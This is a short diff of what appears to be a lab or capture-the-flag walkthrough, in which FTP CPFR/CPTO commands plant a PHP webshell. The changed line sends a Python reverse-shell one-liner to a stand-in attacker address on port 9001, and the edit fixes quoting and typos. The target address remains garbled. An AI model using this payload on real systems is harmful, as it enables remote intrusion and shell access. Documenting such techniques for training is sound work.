@@ -585,7 +585,7 @@ ___
     # With the socket object, send CPFR and CPTO commands to create a PHP webshell.  
     # # Have the webshell read from a GET variable, and send along your reverse shell!
 
-    requests .get("http://192.168.229.le5/rce.php?c=python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.ATTACKR.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(),2); os.system(\"/bin/sh\")'")
+    requests .get("http://192.168.229.le5/rce.php?c=python -c 'import os, socket; s=socket.socket(); s.connect((\"YOUR.ATTACKR.IP.ADDRESS\",9001)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(),2); os.system(\"/bin/sh\")'")
     ```  
 
 * You will see the server connect back!
